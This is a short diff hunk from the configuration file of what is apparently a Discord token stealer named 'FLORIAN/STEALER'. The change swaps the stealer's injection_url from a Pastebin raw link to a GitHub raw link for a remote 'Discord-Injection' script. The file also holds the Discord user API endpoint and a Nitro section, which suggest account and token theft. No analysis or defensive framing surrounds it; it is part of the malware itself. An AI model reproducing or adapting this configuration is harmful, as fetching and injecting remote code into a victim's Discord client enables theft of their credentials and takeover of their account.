@@ -14,7 +14,7 @@ const config = {
   embed_name: 'FLORIAN/STEALER', 
   embed_icon: ''.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://pastebin.com/raw/BkVZexp8', 
+  injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
